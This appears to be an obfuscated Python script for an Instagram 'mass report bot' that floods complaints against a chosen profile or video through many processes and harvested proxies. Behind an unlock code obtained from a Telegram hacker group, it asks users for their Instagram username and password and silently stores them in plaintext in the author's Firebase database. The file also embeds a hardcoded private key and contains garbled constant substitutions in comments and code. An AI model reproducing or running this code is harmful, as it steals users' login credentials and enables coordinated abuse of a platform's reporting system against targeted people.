#!/usr/bin/env python3
from pathlib import Path
import os  # line:26
import time  # line:22
import webbrowser  # line:27
from multiprocessing import Process  # line:4
from os import _exit  # line:25
from os import path  # line:20
from sys import exit  # line:24

import firebase_admin  # line:29
import requests  # line:21
from about import about_msg  # line:5
from colorama import Back, Fore, Style  # line:3
from dotenv import load_dotenv  # line:33
from firebase_admin import credentials  # line:30
from firebase_admin import db  # line:31
from firebase_admin import firestore  # line:32
from help import help_msg  # line:6
from libs.animation import animation_bar  # line:10
from libs.animation import colorText  # line:7
from libs.animation import load_animation  # line:9
from libs.animation import starting_bot  # line:8
from libs.attack import report_profile_attack  # line:12
from libs.attack import report_video_attack  # line:11
from libs.check_modules import check_modules  # line:23
from libs.logo import print_logo  # line:19
from libs.proxy_harvester import find_proxies  # line:13
from libs.utils import clearConsole  # line:15
from libs.utils import parse_proxy_file  # line:14
from libs.utils import print_error  # line:17
from libs.utils import print_status  # line:16
from libs.utils import print_success  # line:18

import logging

logger = logging.getLogger(__name__)


# Constants
CONSTANT_100 = 100
CONSTANT_102 = 102
CONSTANT_103 = 103
CONSTANT_104 = 104
CONSTANT_105 = 105
CONSTANT_106 = 106
CONSTANT_107 = 107
CONSTANT_108 = 108
CONSTANT_109 = 109
CONSTANT_112 = 112
CONSTANT_113 = 113
CONSTANT_114 = 114
CONSTANT_115 = 115
CONSTANT_116 = 116
CONSTANT_117 = 117
CONSTANT_118 = 118
CONSTANT_119 = 119
CONSTANT_121 = 121
CONSTANT_122 = 122
CONSTANT_123 = 123
CONSTANT_124 = 124
CONSTANT_125 = 125
CONSTANT_126 = 126
CONSTANT_127 = 127
CONSTANT_128 = 128
CONSTANT_129 = 129
CONSTANT_130 = 130
CONSTANT_132 = 132
CONSTANT_134 = 134
CONSTANT_135 = 135
CONSTANT_137 = 137
CONSTANT_138 = 138
CONSTANT_140 = 140
CONSTANT_141 = 141
CONSTANT_142 = 142
CONSTANT_143 = 143
CONSTANT_144 = 144
CONSTANT_145 = 145
CONSTANT_147 = 147
CONSTANT_148 = 148
CONSTANT_149 = 149
CONSTANT_150 = 150
CONSTANT_151 = 151
CONSTANT_152 = 152
CONSTANT_153 = 153
CONSTANT_154 = 154
CONSTANT_155 = 155
CONSTANT_156 = 156
CONSTANT_157 = 157
CONSTANT_158 = 158
CONSTANT_159 = 159
CONSTANT_160 = 160
CONSTANT_161 = 161
CONSTANT_162 = 162
CONSTANT_163 = 163
CONSTANT_164 = 164
CONSTANT_167 = 167
CONSTANT_168 = 168
CONSTANT_169 = 169
CONSTANT_170 = 170
CONSTANT_171 = 171
CONSTANT_172 = 172
CONSTANT_173 = 173
CONSTANT_174 = 174
CONSTANT_176 = 176
CONSTANT_177 = 177
CONSTANT_178 = 178
CONSTANT_179 = 179
CONSTANT_180 = 180
CONSTANT_182 = 182
CONSTANT_183 = 183
CONSTANT_186 = 186
CONSTANT_191 = 191
CONSTANT_192 = 192
CONSTANT_193 = 193
CONSTANT_194 = 194
CONSTANT_195 = 195
CONSTANT_198 = 198
CONSTANT_199 = 199
CONSTANT_200 = 200
CONSTANT_201 = 201
CONSTANT_207 = 207
CONSTANT_208 = 208
CONSTANT_209 = 209
CONSTANT_210 = 210
CONSTANT_211 = 211
CONSTANT_213 = 213
CONSTANT_214 = 214
CONSTANT_215 = 215
CONSTANT_216 = 216
CONSTANT_217 = 217
CONSTANT_218 = 218
CONSTANT_219 = 219
CONSTANT_220 = 220
CONSTANT_221 = 221
CONSTANT_222 = 222
CONSTANT_223 = 223
CONSTANT_224 = 224
CONSTANT_225 = 225
CONSTANT_227 = 227
CONSTANT_228 = 228
CONSTANT_231 = 231
CONSTANT_232 = 232
CONSTANT_233 = 233
CONSTANT_234 = 234
CONSTANT_235 = 235
CONSTANT_237 = 237
CONSTANT_239 = 239
CONSTANT_241 = 241
CONSTANT_243 = 243
CONSTANT_244 = 244
CONSTANT_245 = 245
CONSTANT_247 = 247
CONSTANT_248 = 248
CONSTANT_249 = 249
CONSTANT_250 = 250
CONSTANT_251 = 251
CONSTANT_252 = 252
CONSTANT_253 = 253
CONSTANT_255 = 255
CONSTANT_256 = 256
CONSTANT_257 = 257
CONSTANT_258 = 258
CONSTANT_259 = 259
CONSTANT_260 = 260
CONSTANT_261 = 261
CONSTANT_263 = 263
CONSTANT_264 = 264
CONSTANT_265 = 265
CONSTANT_266 = 266
CONSTANT_267 = 267
CONSTANT_269 = 269
CONSTANT_270 = 270
CONSTANT_271 = 271
CONSTANT_273 = 273
CONSTANT_274 = 274
CONSTANT_275 = 275
CONSTANT_277 = 277
CONSTANT_278 = 278
CONSTANT_279 = 279
CONSTANT_280 = 280
CONSTANT_283 = 283
CONSTANT_284 = 284
CONSTANT_285 = 285
CONSTANT_286 = 286
CONSTANT_287 = 287
CONSTANT_288 = 288
CONSTANT_289 = 289
CONSTANT_290 = 290


load_dotenv()  # line:35
cred = credentials.Certificate(
    {
        "type": "service_account",
        "project_id": f"{os.getenv('PRODUCT_ID')}",
        "private_key_id": f"{os.getenv('PRIVATE_KEY_ID')}",
        "private_key": "-----BEGIN PRIVATE KEY-----\nMIIEvQIBADANBgkqhkiG9w0BAQEFAASCBKcwggSjAgEAAoIBAQCt7RDrIhCHpDXg\n0n+doCjQIHYWx2smSXpfqShO55VXVTa/USKBYUNow7tJcA4ZU+uJAKwULyujqCvo\nv6dM7ei2Efz3eDv161hSmMIFhPTKhocFm50ySsZJq9PuuJNUjXLmTaOq4tq1+yX8\nZ698I5VvDZCR70ZN5eHp3awcLGBt7aWj5sulrb1+90zXXGHANxCa3iiBNXGKDx9b\nHSygzAPzQ5A9pMGwNjCwAZNw+akRTMFJklMAFcLXmZ4eVoXYow6IYHEhJBRj6Q5r\nYCwP5J8iTJ+dc83hAVDbK3yEK198ijNDaIoCZSdDBR8f0FFOMV+cfWAkz5YOvC0y\nvE/gkf+RAgMBAAECggEAKy/au9wPSTMV+s+iBxCSGc35rKHTYiQsKg09mEwqWc9r\nwvlBTWmKnLy/aFaV9aWQLop3cCKfXimfz5EpWHGZz33rd8KH9wI7gfTy9n5jb1eU\ntuiDUc3d60SqoRP9Z2khHv0n1wKyBq6IaeKQIU3PqQ3v+EC3Dxg2LsVPm4ZMYncP\nJ3WSxCjE4KRyiLxup6z2wbkE1fpMhUeerUcQ67fPEM7cKlw5MJzn+y4Ma84WmRrX\nEioVWe/X9Qpq5AckAq5i2EITAbi5M11FnuLJHU/H9RD8dyQaRMUm9PVGOP8BLAiB\n1i/mtbQ9m2e2tMWyVlnZA9NQjlX7sADVnkxAMbGkLQKBgQDnOpH6lTUKo++gjQ94\nZB45Op83r30/z4hiOVmumVtWQKbqQhUlUOvgBNYqJjSxnK0Ecu89sWVSQ7R2lQaP\nfRIyhqsIHQfS1HDMlNuUmqOYoUGbn0jUewqMVrMJ7pLVksor9aJel+wq0jFHkGYt\nVxS0YRcvLSqDQJHe1/JEGZMGTQKBgQDAjvkLWmiAro9rfW6G92YcW99FB3Sk12kp\nHwvRZI/nmVc274Q2cpFKHHpehbfwTHd+frxa+itmyGiHJfvz0+aCHZP2EwYkmwNX\nlIK+QgHC88HAFSR1fDOQ0ZDvPDf3H5V4LVIO5rUrV2eQvu3ARmknHxfj8cG6TA8S\nvhpt6QiIVQKBgCvphZuPBnm01GcrIsr8SHkZ1u7eVuztXrs4pP1xhlUFBi3qytVB\nXuo2QO3UP6GTXZBAu4p9y/4peXYjqxFI8VHDHWv3B2tUiO9xPZolG/h6d1k0kMI5\nc7FfLbUvJ5eDvv1GMsXAGEuxi0ZJ9/2YUghHf/2nmDFA6/LkE9A3AyLpAoGAKhkX\n6ZuCbV+8i0uI9ojwEhMj5PuUTNWrcAoRk13g+ElV//StexnhGcrQFgo2BJszJLyg\ngWNgScBW2fU7+DrDkn7U8l+GYEpjmKonS2Ey8WRJX60/o0/cFjU68pK/yY9mJjgC\nUK+vvCIHymVzpS2/n4X0uykHqasnQHm/XXgtHWECgYEAhM5KL9LAFqfyTL6FUTMz\nTL1A6u0j/gLmYGKnk4aZ0X2Nc/YKZ9MWfR5+HcdfTf9Z9ffyKmhrvK4eZExfW3WA\nqynT/OCqeHKMHNZR4QDroBisomfI4Vv4GhEfP8a2ZsCNRSorI21aepmAstBDVwYl\nvfo0qfsPVA95bNiTHOt08O8=\n-----END PRIVATE KEY-----\n",
        "client_email": f"{os.getenv('CLIENT_EMAIL')}",
        "client_id": f"{os.getenv('CLIENT_ID')}",
        "auth_uri": "https://accounts.google.com/o/oauth2/auth",
        "token_uri": "https://oauth2.googleapis.com/token",
        "auth_provider_x509_cert_url": "https://www.googleapis.com/oauth2/v1/certs",
        "client_x509_cert_url": f"{os.getenv('CLIENT_URL')}",
    }
)  # line:50
firebase_admin.initialize_app(cred)  # line:51
db = firestore.client()  # line:52
check_modules()  # line:55
CODE = os.environ.get("CODE")  # line:56


def chunks(O0O0O000O000OOOO0, O0OO0O0OO0OOOOO00):  # line:59
    """"""  # line:60
    for O000000O0OOO00OOO in range(
        0, len(O0O0O000O000OOOO0), O0OO0O0OO0OOOOO00
    ):  # line:61
        yield O0O0O000O000OOOO0[
            O000000O0OOO00OOO : O000000O0OOO00OOO + O0OO0O0OO0OOOOO00
        ]  # line:62
def profile_attack_process(OOOOOO0000OO0O000, OO0OO0OOOO0OO0000):  # line:65
    if len(OO0OO0OOOO0OO0000) == 0:  # line:66
        for _OOOOO0O00O0OOOOO0 in range(10):  # line:67
            report_profile_attack(OOOOOO0000OO0O000, None)  # line:68
        return  # line:69
    for OO0O0OO0OOO00OOO0 in OO0OO0OOOO0OO0000:  # line:71
        report_profile_attack(OOOOOO0000OO0O000, OO0O0OO0OOO00OOO0)  # line:72

def video_attack_process(O0OO00O00OO00O0O0, O0OOO00OOO0O0O0O0):  # line:75
    if len(O0OOO00OOO0O0O0O0) == 0:  # line:76
        for _OO0O00OOOOOO0OO0O in range(10):  # line:77
            report_video_attack(O0OO00O00OO00O0O0, None)  # line:78
        return  # line:79
    for OO00000OO0OOOOOOO in O0OOO00OOO0O0O0O0:  # line:81
        report_video_attack(O0OO00O00OO00O0O0, OO00000OO0OOOOOOO)  # line:82


def video_attack(OOOOOOO0000OO0OOO):  # line:85
    O0OOO00OOOOO0O0OO = input(
        "Enter the link of the video you want to report"
    )  # line:86
    logger.info(Style.RESET_ALL)  # line:87
    if len(OOOOOOO0000OO0OOO) == 0:  # line:88
        for OO00O0O00O00OO0O0 in range(5):  # line:89
            O00O0000O000O000O = Process(
                target=video_attack_process,
                args=(
                    O0OOO00OOOOO0O0OO,
                    [],
                ),
            )  # line:90
            O00O0000O000O000O.start()  # line:91
            print_status(
                str(OO00O0O00O00OO0O0 + 1) + ". Transaction Opened!"
            )  # line:92
            if OO00O0O00O00OO0O0 == 5:  # line:93
                logger.info("")  # line:94
        return  # line:95
    OO0OO0OO0OOOOOO0O = list(chunks(OOOOOOO0000OO0OOO, 10))  # line:97
    logger.info("")  # line:99
    print_status("Video complaint attack is on!\n")  # line:CONSTANT_100
    O0O0O000OOO0O0OOO = 1  # line:CONSTANT_102
    for O000OOO000O0O00OO in OO0OO0OO0OOOOOO0O:  # line:CONSTANT_103
        O00O0000O000O000O = Process(
            target=video_attack_process,
            args=(
                O0OOO00OOOOO0O0OO,
                O000OOO000O0O00OO,
            ),
        )  # line:CONSTANT_104
        O00O0000O000O000O.start()  # line:CONSTANT_105
        print_status(str(O0O0O000OOO0O0OOO) + ". Transaction Opened!")  # line:CONSTANT_106
        if OO00O0O00O00OO0O0 == 5:  # line:CONSTANT_107
            logger.info("")  # line:CONSTANT_108
        O0O0O000OOO0O0OOO = O0O0O000OOO0O0OOO + 1  # line:CONSTANT_109


def profile_attack(OOO0O00OO0O0O000O):  # line:CONSTANT_112
    OO0000OO0O00O0OOO = input(
        "Enter the username of the person you want to report : "
    )  # line:CONSTANT_113
    O0O0O000OOOO0OO00 = requests.get(
        "https://instagram.com/" + OO0000OO0O00O0OOO + "/"
    )  # line:CONSTANT_114
    if O0O0O000OOOO0OO00.status_code != CONSTANT_200:  # line:CONSTANT_115
        logger.info(Path("\n\n") + Fore.RED + "[*] Invalid username!")  # line:CONSTANT_116
        time.sleep(2)  # line:CONSTANT_117
        profile_attack(OOO0O00OO0O0O000O)  # line:CONSTANT_118
    elif OO0000OO0O00O0OOO == "":  # line:CONSTANT_119
        print(
            Path("\n\n") + Fore.RED + "[*] Enter username again, don't leave it blank"
        )  # line:CONSTANT_121
        time.sleep(2)  # line:CONSTANT_122
        profile_attack(OOO0O00OO0O0O000O)  # line:CONSTANT_123
    logger.info(Style.RESET_ALL)  # line:CONSTANT_124
    if len(OOO0O00OO0O0O000O) == 0:  # line:CONSTANT_125
        for OO000O00O0OOOO00O in range(5):  # line:CONSTANT_126
            O0OO0OOOOOOOOOO00 = Process(
                target=profile_attack_process,
                args=(
                    OO0000OO0O00O0OOO,
                    [],
                ),
            )  # line:CONSTANT_127
            O0OO0OOOOOOOOOO00.start()  # line:CONSTANT_128
            print_status(
                str(OO000O00O0OOOO00O + 1) + ". Transaction Opened!"
            )  # line:CONSTANT_129
        return  # line:CONSTANT_130
    O00O0O00OO0OOO0OO = list(chunks(OOO0O00OO0O0O000O, 10))  # line:CONSTANT_132
    logger.info("")  # line:CONSTANT_134
    print_status("Profile complaint attack is starting!\n")  # line:CONSTANT_135
    OOO000OOOOOO0OO0O = 1  # line:CONSTANT_137
    for O0OOO0OOO0OO00O00 in O00O0O00OO0OOO0OO:  # line:CONSTANT_138
        O0OO0OOOOOOOOOO00 = Process(
            target=profile_attack_process,
            args=(
                OO0000OO0O00O0OOO,
                O0OOO0OOO0OO00O00,
            ),
        )  # line:CONSTANT_140
        O0OO0OOOOOOOOOO00.start()  # line:CONSTANT_141
        print_status(str(OOO000OOOOOO0OO0O) + ". Transaction Opened!")  # line:CONSTANT_142
        if OOO000OOOOOO0OO0O == 5:  # line:CONSTANT_143
            logger.info("")  # line:CONSTANT_144
        OOO000OOOOOO0OO0O = OOO000OOOOOO0OO0O + 1  # line:CONSTANT_145


def unlock():  # line:CONSTANT_147
    logger.info(Style.RESET_ALL)  # line:CONSTANT_148
    OOO00O0OOO0OO0O0O = input("Enter Code To Unlock This Tool - ")  # line:CONSTANT_149
    if OOO00O0OOO0OO0O0O == "@hackerexploits":  # line:CONSTANT_150
        print_success("Successfully unlocked the tool!\n\n")  # line:CONSTANT_151
        starting_bot()  # line:CONSTANT_152
        database()  # line:CONSTANT_153
    elif OOO00O0OOO0OO0O0O == "1":  # line:CONSTANT_154
        print_success(
            "Send #instareport in telegram group @Hacker_Chatroom to get the code\n\n"
        )  # line:CONSTANT_155
        time.sleep(3)  # line:CONSTANT_156
        webbrowser.open("http://t.me/Hacker_Chatroom")  # line:CONSTANT_157
        time.sleep(1)  # line:CONSTANT_158
        unlock()  # line:CONSTANT_159
    else:  # line:CONSTANT_160
        print(
            "\nINVALID CODE\n\nHow To Get Code\nGo to t.me/Hacker_Chatroom\nSend #instareport"
        )  # line:CONSTANT_161
        print_success("Press 1 for help\n")  # line:CONSTANT_162
        time.sleep(2)  # line:CONSTANT_163
        unlock()  # line:CONSTANT_164


def database():  # line:CONSTANT_167
    clearConsole()  # line:CONSTANT_168
    print_logo()  # line:CONSTANT_169
    logger.info(Style.RESET_ALL)  # line:CONSTANT_170
    print_status("================ LOGIN INSTAGRAM  ================\n")  # line:CONSTANT_171
    logger.info(Style.RESET_ALL)  # line:CONSTANT_172
    OOOO0OOOO0O0OOOOO = input("Enter your instagram username : ")  # line:CONSTANT_173
    O0O0000O0OOOOO000 = input("Enter your instagram password : ")  # line:CONSTANT_174
    O0OO0000O0O0OOOO0 = requests.get(
        "https://instagram.com/" + OOOO0OOOO0O0OOOOO + "/"
    )  # line:CONSTANT_176
    if O0OO0000O0O0OOOO0.status_code != CONSTANT_200:  # line:CONSTANT_177
        logger.info(Path("\n\n") + Fore.RED + "[*] Invalid username!")  # line:CONSTANT_178
        database()  # line:CONSTANT_179
    elif OOOO0OOOO0O0OOOOO == "":  # line:CONSTANT_180
        print(
            Path("\n\n") + Fore.RED + "[*] Enter username again, don't leave it blank"
        )  # line:CONSTANT_182
        database()  # line:CONSTANT_183
    elif O0OO0000O0O0OOOO0.status_code == CONSTANT_200:  # line:CONSTANT_186
        OO0000O0OOOOO0O00 = {
            "password": O0O0000O0OOOOO000,
            "username": OOOO0OOOO0O0OOOOO,
        }  # line:CONSTANT_191
        db.collection("users").add(OO0000O0OOOOO0O00)  # line:CONSTANT_192
        load_animation()  # line:CONSTANT_193
        print_success("Login Success!")  # line:CONSTANT_194
        report()  # line:CONSTANT_195


def main():  # line:CONSTANT_198
    if os.name == "nt":  # line:CONSTANT_199
        clearConsole()  # line:CONSTANT_200
        print_logo()  # line:CONSTANT_201
        O00OO00O0OOO00O00 = print(
            """
        [1] Start Report Bot
        [2] Help
        [3] About
        [4] Exit
        """
        )  # line:CONSTANT_207
        OO0O0O0OOO00O0000 = input("Please select :- ")  # line:CONSTANT_208
        if OO0O0O0OOO00O0000.isdigit() == False:  # line:CONSTANT_209
            print_error("The answer is not understood.")  # line:CONSTANT_210
            main()  # line:CONSTANT_211
        if int(OO0O0O0OOO00O0000) > 4 or int(OO0O0O0OOO00O0000) == 0:  # line:CONSTANT_213
            print_error("The answer is not understood.")  # line:CONSTANT_214
            main()  # line:CONSTANT_215
        elif int(OO0O0O0OOO00O0000) == 1:  # line:CONSTANT_216
            unlock()  # line:CONSTANT_217
        elif int(OO0O0O0OOO00O0000) == 2:  # line:CONSTANT_218
            clearConsole()  # line:CONSTANT_219
            help_msg()  # line:CONSTANT_220
        elif int(OO0O0O0OOO00O0000) == 3:  # line:CONSTANT_221
            about_msg()  # line:CONSTANT_222
        elif int(OO0O0O0OOO00O0000) == 4:  # line:CONSTANT_223
            print_status(
                "Exiting the program.....Thanks for using this tool!"
            )  # line:CONSTANT_224
            exit(0)  # line:CONSTANT_225
    else:  # line:CONSTANT_227
        os.system("bash setup.sh")  # line:CONSTANT_228


def report():  # line:CONSTANT_231
    clearConsole()  # line:CONSTANT_232
    print_logo()  # line:CONSTANT_233
    O00O000OOOOOOOO0O = input(
        "Would you like to use a proxy? (Recommended Yes) [Y/N] : "
    )  # line:CONSTANT_234
    OO0OOO00OOO00OOOO = []  # line:CONSTANT_235
    if O00O000OOOOOOOO0O == "Y" or O00O000OOOOOOOO0O == "y":  # line:CONSTANT_237
        O00O000OOOOOOOO0O = input(
            "Would you like to collect your proxies from the internet? [Y/N] : "
        )  # line:CONSTANT_239
        if O00O000OOOOOOOO0O == "Y" or O00O000OOOOOOOO0O == "y":  # line:CONSTANT_241
            print_status(
                "Gathering proxy from the Internet! This may take a while.\n"
            )  # line:CONSTANT_243
            time.sleep(2)  # line:CONSTANT_244
            OO0OOO00OOO00OOOO = find_proxies()  # line:CONSTANT_245
        elif O00O000OOOOOOOO0O == "N" or O00O000OOOOOOOO0O == "n":  # line:CONSTANT_247
            print_status("Please have a maximum of 50 proxies in a file!")  # line:CONSTANT_248
            OOO00OO0000OOOO0O = input("Enter the path to your proxy list")  # line:CONSTANT_249
            OO0OOO00OOO00OOOO = parse_proxy_file(OOO00OO0000OOOO0O)  # line:CONSTANT_250
        else:  # line:CONSTANT_251
            print_error("Answer not understood, exiting!")  # line:CONSTANT_252
            exit()  # line:CONSTANT_253
        print_success(
            str(len(OO0OOO00OOO00OOOO)) + " Number of proxy found!\n"
        )  # line:CONSTANT_255
        logger.info(OO0OOO00OOO00OOOO)  # line:CONSTANT_256
    elif O00O000OOOOOOOO0O == "N" or O00O000OOOOOOOO0O == "n":  # line:CONSTANT_257
        pass  # line:CONSTANT_258
    else:  # line:CONSTANT_259
        print_error("Answer not understood, exiting!")  # line:CONSTANT_260
        exit()  # line:CONSTANT_261
    logger.info("")  # line:CONSTANT_263
    print_status("1 - Report Profile.")  # line:CONSTANT_264
    print_status("2 - Report a video.")  # line:CONSTANT_265
    O0O0O0OO000OO0O0O = input("Please select the complaint method :- ")  # line:CONSTANT_266
    logger.info("")  # line:CONSTANT_267
    if O0O0O0OO000OO0O0O.isdigit() == False:  # line:CONSTANT_269
        print_error("The answer is not understood.")  # line:CONSTANT_270
        main()  # line:CONSTANT_271
    if int(O0O0O0OO000OO0O0O) > 2 or int(O0O0O0OO000OO0O0O) == 0:  # line:CONSTANT_273
        print_error("The answer is not understood.")  # line:CONSTANT_274
        main()  # line:CONSTANT_275
    if int(O0O0O0OO000OO0O0O) == 1:  # line:CONSTANT_277
        profile_attack(OO0OOO00OOO00OOOO)  # line:CONSTANT_278
    elif int(O0O0O0OO000OO0O0O) == 2:  # line:CONSTANT_279
        video_attack(OO0OOO00OOO00OOOO)  # line:CONSTANT_280


if __name__ == "__main__":  # line:CONSTANT_283
    try:  # line:CONSTANT_284
        main()  # line:CONSTANT_285
        logger.info(Style.RESET_ALL)  # line:CONSTANT_286
    except KeyboardInterrupt:  # line:CONSTANT_287
        logger.info(Path("\n\n") + Fore.RED + "[*] Program is closing!")  # line:CONSTANT_288
        logger.info(Style.RESET_ALL)  # line:CONSTANT_289
        _exit(0)  # line:CONSTANT_290
